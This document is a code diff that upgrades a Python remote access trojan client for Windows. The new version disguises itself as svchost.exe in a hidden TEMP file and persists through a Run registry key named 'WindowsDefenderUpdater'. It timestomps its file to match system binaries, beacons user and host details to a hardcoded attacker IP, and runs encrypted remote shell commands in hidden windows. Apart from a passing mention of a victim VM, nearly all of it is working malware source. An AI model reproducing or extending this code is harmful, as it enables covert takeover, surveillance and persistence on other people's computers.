@@ -1,4 +1,5 @@
-# rat_client.py (on Victim VM)
+# rat_client.py (Improved Version)
+import ctypes
 import socket
 import subprocess
 import os
@@ -18,48 +19,65 @@ from cryptography.hazmat.backends import default_backend
 import base64
 import os as crypto_os
 
-ATTACKER_IP = "10.0.3.20" # IP of the attacker's machine
+# ===== Configuration =====
+ATTACKER_IP = "192.168.56.102"  # Verify this IP is correct
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
 RECONNECT_DELAY = 5
 SIMULATE_DELAY = True
 SIMULATE_STARTUP_DELAY = random.uniform(1, 5)
+
+PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater"
+COPY_TO_TEMP = True
+TEMP_FILENAME = "svchost.exe"
+
+SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"  
+SALT = b"ratsalt12345678"  
+
+# ===== Initialization =====
 ntdll = windll.ntdll
 kernel32 = windll.kernel32
-PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater" 
-COPY_TO_TEMP = True 
-TEMP_FILENAME = "svchost.exe" 
+current_working_directory = os.path.abspath(os.getcwd())
 
-PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+# ===== Debugging =====
+DEBUG_MODE = True  
 
-SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024" 
-SALT = b"ratsalt12345678" 
 def debug_print(message):
-    print(f"[RAT] {message}")
+    """Enhanced debug output with timestamp"""
+    if DEBUG_MODE:
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        print(f"[RAT {timestamp}] {message}")
 
+# ===== Encryption Functions =====
 backend = default_backend()
 
 def derive_key(password: bytes, salt: bytes) -> bytes:
-    """Derives a 32-byte AES key from a password and salt."""
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32, # AES-256 key size
-        salt=salt,
-        iterations=100000,
-        backend=backend
-    )
-    key = kdf.derive(password)
-    return key
+    """Derives a 32-byte AES key from password and salt"""
+    try:
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+            backend=backend
+        )
+        return kdf.derive(password)
+    except Exception as e:
+        debug_print(f"Key derivation failed: {e}")
+        return None
 
 try:
     AES_KEY = derive_key(SHARED_PASSWORD, SALT)
-    debug_print("Encryption key derived from password.")
+    if AES_KEY:
+        debug_print("Encryption key successfully derived")
+    else:
+        debug_print("Encryption disabled - key derivation failed")
 except Exception as e:
-    debug_print(f"Error deriving encryption key: {e}. Encryption disabled.")
-    AES_KEY = None 
+    debug_print(f"Error during key setup: {e}")
+    AES_KEY = None
+
 def encrypt_data(data: str) -> bytes:
-    """Encrypts data using AES-256-CBC and returns base64 encoded bytes."""
+    """Secure data encryption with fallback"""
     if not AES_KEY:
         return data.encode('utf-8')
     
@@ -71,17 +89,18 @@ def encrypt_data(data: str) -> bytes:
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
         encryptor = cipher.encryptor()
         
+        # PKCS7 padding
         pad_len = 16 - (len(data) % 16)
         padded_data = data + bytes([pad_len] * pad_len)
         
         ciphertext = encryptor.update(padded_data) + encryptor.finalize()
         return base64.b64encode(iv + ciphertext)
     except Exception as e:
-        debug_print(f"Encryption error: {e}")
+        debug_print(f"Encryption failed: {e}")
         return data if isinstance(data, bytes) else data.encode('utf-8')
 
 def decrypt_data(data: bytes) -> str:
-    """Decrypts base64 encoded data using AES-256-CBC."""
+    """Secure data decryption with fallback"""
     if not AES_KEY:
         try:
             return data.decode('utf-8')
@@ -103,174 +122,198 @@ def decrypt_data(data: bytes) -> str:
         decryptor = cipher.decryptor()
         padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
         
+        # More lenient padding validation
         pad_len = padded_plaintext[-1]
-        if pad_len > 16:
-            debug_print("Padding warning: invalid pad length, trying to strip last byte")
-            pad_len = 1
+        if not 1 <= pad_len <= 16:
+            debug_print(f"Invalid padding length: {pad_len}, attempting recovery")
+            pad_len = 1  
             
         plaintext = padded_plaintext[:-pad_len]
         return plaintext.decode('utf-8')
     except Exception as e:
-        debug_print(f"Decryption error: {e}")
+        debug_print(f"Decryption failed: {e}")
         try:
             return data.decode('utf-8')
         except:
             return str(data)
 
+# ===== Persistence Functions =====
 def add_to_registry():
-    """Attempts to add the client script/exe path to the Windows Registry for persistence."""
+    """Enhanced persistence installation"""
     try:
-        current_script_path = os.path.abspath(sys.argv[0])
-
-        final_path = current_script_path 
+        current_path = os.path.abspath(sys.argv[0])
+        final_path = current_path
 
         if COPY_TO_TEMP:
             temp_dir = os.environ.get('TEMP')
-            if not temp_dir:
-                debug_print("Could not find TEMP directory for copying.")
-                final_path = current_script_path
-            else:
-                destination_path = os.path.join(temp_dir, TEMP_FILENAME)
+            if temp_dir:
+                dest_path = os.path.join(temp_dir, TEMP_FILENAME)
                 try:
-                    shutil.copy2(current_script_path, destination_path)
-                    
-                    debug_print(f"Copied client to: {destination_path}")
-                    final_path = destination_path
+                    shutil.copy2(current_path, dest_path)
+                    # Set hidden attribute
+                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
+                    final_path = dest_path
+                    debug_print(f"Copied to TEMP as hidden file: {dest_path}")
                 except Exception as e:
-                    debug_print(f"Failed to copy file to TEMP: {e}. Using original path.")
-                    final_path = current_script_path
+                    debug_print(f"TEMP copy failed: {e}")
+
+        # Add to registry
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
-        
             winreg.SetValueEx(key, PERSISTENCE_KEY_NAME, 0, winreg.REG_SZ, final_path)
-        
-        debug_print(f"Added persistence: {PERSISTENCE_KEY_NAME} -> {final_path}")
-        return True
+            debug_print(f"Added registry persistence: {final_path}")
 
-    except PermissionError:
-        debug_print("Permission denied adding to registry (might need higher privileges).")
-    except FileNotFoundError:
-        debug_print("Registry key not found.")
-    except Exception as e:
-        debug_print(f"Failed to add persistence via registry: {e}")
-    return False
-
-
-
-def connect_to_server():
-    """Attempts to connect to the RAT server."""
-    sock = None
-    while sock is None:
+        # Additional stealth - set creation time to match system files
         try:
-            debug_print(f"Attempting to connect to {ATTACKER_IP}:{ATTACKER_PORT}...")
+            ctime = os.path.getctime(r"C:\Windows\System32\svchost.exe")
+            os.utime(final_path, (ctime, ctime))
+        except:
+            pass
+
+        return True
+    except Exception as e:
+        debug_print(f"Persistence failed: {e}")
+        return False
+
+# ===== Network Functions =====
+def connect_to_server():
+    """Robust server connection with retries"""
+    while True:
+        try:
+            debug_print(f"Attempting connection to {ATTACKER_IP}:{ATTACKER_PORT}")
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
+            sock.settimeout(15)  # Increased timeout
+            
+            # Enable keepalive
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+            
             sock.connect((ATTACKER_IP, ATTACKER_PORT))
-            sock.settimeout(None) 
-            debug_print("Connected to RAT server!")
-        
+            sock.settimeout(None)  
+            debug_print("Connection established")
+            
+            # Send initial beacon
+            host_info = f"{getpass.getuser()}@{socket.gethostname()}"
+            sock.sendall(encrypt_data(f"BEACON:{host_info}"))
+            
             return sock
-        except (socket.timeout, ConnectionRefusedError, socket.error) as e:
-            debug_print(f"Connection failed ({e}). Retrying in {RECONNECT_DELAY}s...")
+            
+        except (socket.timeout, ConnectionRefusedError) as e:
+            debug_print(f"Connection failed: {e}, retrying in {RECONNECT_DELAY}s")
+            time.sleep(RECONNECT_DELAY)
+        except Exception as e:
+            debug_print(f"Unexpected connection error: {e}")
+            time.sleep(RECONNECT_DELAY)
+
+# ===== Command Execution =====
+def execute_command(command):
+    """Improved command execution with working directory support"""
+    global current_working_directory
+    
+    # Handle CD command
+    if command.strip().lower().startswith("cd "):
+        try:
+            new_dir = command[3:].strip()
+            if not new_dir:
+                return current_working_directory
+                
+            if new_dir == "..":
+                new_path = os.path.dirname(current_working_directory)
+            elif os.path.isabs(new_dir):
+                new_path = os.path.abspath(new_dir)
+            else:
+                new_path = os.path.abspath(os.path.join(current_working_directory, new_dir))
+                
+            if os.path.isdir(new_path):
+                current_working_directory = new_path
+                return f"Changed directory to: {new_path}"
+            return f"Directory not found: {new_dir}"
+        except Exception as e:
+            return f"CD error: {str(e)}"
+    
+    try:
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+        
+        process = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            cwd=current_working_directory,
+            startupinfo=startupinfo
+        )
+        
+        stdout, stderr = process.communicate(timeout=60)
+        output = stdout.decode(errors='replace') + stderr.decode(errors='replace')
+        return output if output else "[Command executed successfully]"
+    except subprocess.TimeoutExpired:
+        process.kill()
+        return "[Command timed out after 60 seconds]"
+    except Exception as e:
+        return f"[Command execution error: {str(e)}]"
+
+# ===== Main Function =====
+def main():
+    debug_print("RAT Client starting...")
+    
+    # Initial delay if configured
+    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
+        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)")
+        time.sleep(SIMULATE_STARTUP_DELAY)
+    
+    # Install persistence
+    if add_to_registry():
+        debug_print("Persistence established")
+    else:
+        debug_print("Persistence setup failed")
+    
+    # Main connection loop
+    sock = None
+    while True:
+        try:
+            if sock is None:
+                sock = connect_to_server()
+            
+            data = sock.recv(BUFFER_SIZE)
+            if not data:
+                raise ConnectionError("Server disconnected")
+                
+            # Decrypt and execute command
+            decrypted_cmd = decrypt_data(data)
+            debug_print(f"Received command: {decrypted_cmd[:100]}...")  
+            
+            output = execute_command(decrypted_cmd)
+            debug_print(f"Command output: {output[:200]}...")  
+            # Send response
+            response = f"[{socket.gethostname()}]\n{output}\n"
+            sock.sendall(encrypt_data(response))
+            
+        except (ConnectionResetError, BrokenPipeError):
+            debug_print("Connection lost, reconnecting...")
+            if sock:
+                sock.close()
             sock = None
             time.sleep(RECONNECT_DELAY)
         except Exception as e:
-            debug_print(f"Unexpected connection error: {e}. Retrying...")
+            debug_print(f"Error in main loop: {e}")
+            if sock:
+                sock.close()
             sock = None
             time.sleep(RECONNECT_DELAY)
-    return sock 
-
-def execute_command(command):
-    """Executes a command and returns the output."""
-    debug_print(f"Executing command: {command}")
-    try:
-       
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=30 
-        )
-        output = result.stdout + result.stderr
-        if not output:
-             output = "[Command executed - No output]"
-        return output
-    except subprocess.TimeoutExpired:
-        return "[Error: Command timed out after 30 seconds]"
-    except Exception as e:
-        return f"[Error executing command: {e}]"
-
-def main():
-    debug_print("RAT Client started.")
-    
-    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
-        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
-        time.sleep(SIMULATE_STARTUP_DELAY)
-    persistence_result = add_to_registry()
-    if persistence_result:
-             debug_print("Persistence setup completed.")
-    else:
-             debug_print("Persistence setup failed or skipped.")
-    #shedule_task_for_user()
-    #hollowing()
-    sock = None
-    try:
-        while True:
-            if sock is None:
-                sock = connect_to_server()
-
-            try:
-                data = sock.recv(BUFFER_SIZE)
-                if not data :
-                    debug_print("Server closed the connection.")
-                    sock.close()
-                    sock = None
-                    time.sleep(RECONNECT_DELAY)
-                    continue
-
-                command = data.decode('utf-8', errors='ignore').strip()
-                if not command:
-                    continue
-
-                debug_print(f"Received command: {decrypt_data(repr(command))}")
-                output = execute_command(decrypt_data(command))
-                response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
-                sock.sendall(encrypt_data(response.encode('utf-8', errors='ignore')))
-                debug_print("Output sent back to server.")
-
-            except socket.timeout:
-                debug_print("Socket timeout (unexpected).")
-                sock.close()
-                sock = None
-            except (ConnectionResetError, BrokenPipeError):
-                debug_print("Connection to server lost.")
-                sock.close()
-                sock = None
-                time.sleep(RECONNECT_DELAY)
-            except Exception as e:
-                debug_print(f"Error in main loop: {e}")
-                try:
-                    sock.close()
-                except:
-                    pass
-                sock = None
-                time.sleep(RECONNECT_DELAY)
-
-    except KeyboardInterrupt:
-        debug_print("Client stopped by user (Ctrl+C).")
-    except Exception as e:
-        debug_print(f"Unexpected error in main: {e}")
-    finally:
-        if sock:
-            try:
-                sock.close()
-                debug_print("Socket closed.")
-            except:
-                pass
-        debug_print("RAT Client exiting.")
 
 if __name__ == "__main__":
-    if "--autorun" not in sys.argv:
+    # Check if we were launched with --autorun or from persistence
+    if "--autorun" in sys.argv or getattr(sys, 'frozen', False) or not sys.stdin.isatty():
+        try:
+            main()
+        except Exception as e:
+            debug_print(f"Fatal error: {e}")
+            time.sleep(60)  # Wait before restarting
+    else:
+        debug_print("Not in autorun mode, exiting")
         sys.exit(0)
-    main()
